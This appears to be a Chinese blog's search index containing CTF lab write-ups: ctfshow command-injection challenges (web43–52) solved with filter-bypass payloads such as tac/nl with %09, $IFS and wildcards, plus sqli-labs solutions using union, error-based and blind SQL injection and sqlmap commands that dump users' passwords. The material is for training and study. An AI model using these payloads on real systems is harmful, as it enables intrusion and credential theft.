class=\"line\">同C、C++语言逻辑运算符&quot;&amp;&amp;&quot;类似，遇到首个命令执行失败后，后面的命令不会执行。如：</span><br><span class=\"line\">输入：命令A &amp;&amp; 命令B &amp;&amp; 命令C</span><br><span class=\"line\">先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。</span><br><span class=\"line\">3、“||”分隔符</span><br><span class=\"line\">同C、C++语言逻辑运算符&quot;||&quot;类似，遇到首个命令执行成功后，后面的命令不会执行。如：</span><br><span class=\"line\">输入：命令A || 命令B || 命令C</span><br><span class=\"line\">先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>\n<h1 id=\"web44\"><a href=\"#web44\" class=\"headerlink\" title=\"web44\"></a>web44</h1><p><img src=\"/pic/web44.png\" alt=\"img\"><br>flag也过滤了，就用通配符呗。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac fl*||ls</span><br></pre></td></tr></table></figure>\n<p>常见的通配符有<code>*</code>、<code>?</code>。</p>\n","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow 刷题web45~52","url":"/2023/01/17/ctfshow-%E5%88%B7%E9%A2%98web45~52/","content":"<h1 id=\"web45\"><a href=\"#web45\" class=\"headerlink\" title=\"web45\"></a>web45</h1><p><img src=\"/pic/45.png\" alt=\"img\"><br>过滤了空格，用<code>%09</code>绕过，&amp;&amp;等于;，也可以用<code>||</code>和<code>%0a</code>。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac%09fl*||</span><br><span class=\"line\">/?c=sort%09fl*||</span><br><span class=\"line\">/?c=echo%09`tac%09fla*`||</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web46\"><a href=\"#web46\" class=\"headerlink\" title=\"web46\"></a>web46</h1><p><img src=\"/pic/46.png\" alt=\"img\"><br>多过滤了一些字符，但还是可以%<code>09</code>过滤空格，因为<code>%09</code>解码后就不是数字了，是一个水平制表符。<br><code>*</code>被过滤了，可以用<code>?</code><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac%09fla?.php||</span><br><span class=\"line\">/?c=nl&lt;fla&#x27;&#x27;g.php|| nl查看源代码，&lt;代替空格，&#x27;&#x27;分割flag过滤，||解决命令黑洞</span><br></pre></td></tr></table></figure>\n<h1 id=\"web47\"><a href=\"#web47\" class=\"headerlink\" title=\"web47\"></a>web47</h1><p><img src=\"/pic/47.png\"><br>无非就是sort无法用了，上一题的payload还可以用。</p>\n<h1 id=\"web48\"><a href=\"#web48\" class=\"headerlink\" title=\"web48\"></a>web48</h1><p><img src=\"/pic/48.png\"><br>上一题的payload依然可以用。</p>\n<h1 id=\"web49\"><a href=\"#web49\" class=\"headerlink\" title=\"web49\"></a>web49</h1><p><img src=\"/pic/49.png\"><br>依然可以用。</p>\n<h1 id=\"web50\"><a href=\"#web50\" class=\"headerlink\" title=\"web50\"></a>web50</h1><p><img src=\"/pic/50.png\"><br><code>%09</code>过滤了，<code>&lt;&gt;</code>和<code>?</code>一起使用时没有回显,所以这里的<code>?</code>可以用<code>\\</code>和<code>&#39;&#39;</code>进行代替,。<br>paylaod:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac&lt;fla\\g.php||</span><br><span class=\"line\">/?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web51\"><a href=\"#web51\" class=\"headerlink\" title=\"web51\"></a>web51</h1><p><img src=\"/pic/51.png\"><br>tac被过滤了，只能用nl。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=nl&lt;fla\\g.php||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web52\"><a href=\"#web52\" class=\"headerlink\" title=\"web52\"></a>web52</h1><p><img src=\"/pic/52.png\"><br>&lt;&gt;也被过滤了，还可以用<code>$IFS</code><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=nl$&#123;IFS&#125;fla\\g.php||</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"Hello World","url":"/2023/02/26/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"sqli-labs","url":"/2023/02/20/sqli-labs/","content":"<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h1><p><img src=\"/pic/sqli/1.png\"><br>看报错可知，这是闭合单引号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;order by 3 -- - #确定那个字段有回显</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #查询表名</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -  #查询列名</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #查询当前数据库user表里面的username和password。</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>用sqlmap更简单</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;ip?id=1&quot;</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -dbs #列出所有数据库</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -tables #列出当前数据库里的表</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -T users -columns #列出表里的列</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -T users -C username,password --dump #获取表里的数据</span><br></pre></td></tr></table></figure>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h1><p><img src=\"/pic/sqli/2.png\"><br>这一题就不用闭合，剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1 order by 3 -- - </span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h1><p><img src=\"/pic/sqli/3.png\"><br>看错误提示可知，需要用<code>&#39;)</code>来闭合，剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;) order by 3 -- - </span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h1><p><img src=\"/pic/sqli/4.png\"><br>看错误提示，可知闭合方式是<code>&quot;)</code>，但是单引号不会报错,剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) order by 3 -- - </span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h1><p><img src=\"/pic/sqli/5.png\"><br>根据错误可以判断是单引号报错。联合注入也没有办法用，可以使用报错注入。<br>extractvalue函数<br>payload:id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class=\"line\">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class=\"line\">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class=\"line\">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class=\"line\">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,(select database()))))-- - #获取当前数据库的名称</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -</span><br><span class=\"line\">#查询当前数据库里所有的表</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,31))))-- -</span><br><span class=\"line\">#查询表里列的名称</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br><span class=\"line\">#查询表里面的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># extractvalue()函数能显示的最大长度为32，所以用substr()函数来分页，或者使用limit分页也可以。concat()里面的~也可以是其他的。</span><br></pre></td></tr></table></figure>\n\n<p>updatexml:<br>payload:id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select database())),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; )),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br></pre></td></tr></table></figure>\n\n<p>floor:<br>payload:’union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from “一个足大的表” group by x)a</p>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less-6\"></a>less-6</h1><p>闭合方式为<code>&quot;</code>，报错注入仍可行。</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less-7\"></a>less-7</h1><p>文件读写注入，但是我怎么运行文件都不写入，放弃了。</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less-8\"></a>less-8</h1><p>布尔盲注。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and (ascii(substr(select database()),1,1))==115--+ #判断第一个数据库名字第一个字符的ascii码是否等于115</span><br><span class=\"line\">?id=1&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+ #判断第一个数据库名字第二个字符的ascii码是否等于101</span><br><span class=\"line\">?id=1&#x27;and (length(database())) = 8 --+ #判断数据库名字的长度是否等于8</span><br><span class=\"line\">?id=1&#x27;and (length(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)) = 5 --+ #判断地三张表名字的长度是否为5</span><br><span class=\"line\">?id=1&#x27; and (length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))) = 8 --+ #判断users表里地二个列名的长度是否为8</span><br></pre></td></tr></table></figure>\n<p>如果判断正确的话，页面返回正常。<br>好麻烦啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less-9\"></a>less-9</h1><p>时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if(length(database())&gt;3 ,sleep(5),1) -- - #如果数据库长度长于3的话，延迟5秒返回页面。</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/forforever/p/13019703.html\">MySQL时间盲注五种延时方法 </a></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less-10\"></a>less-10</h1><p>还是时间盲注，闭合方式为<code>&quot;</code>。</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less-11\"></a>less-11</h1><p><img src=\"/pic/sqli/11.png\"><br>这个就在username上直接输入sql语句就行。<br>也可以用hackbar，Post传参。其他语句不变。.</p>\n","categories":["web"],"tags":["sql注入"]}]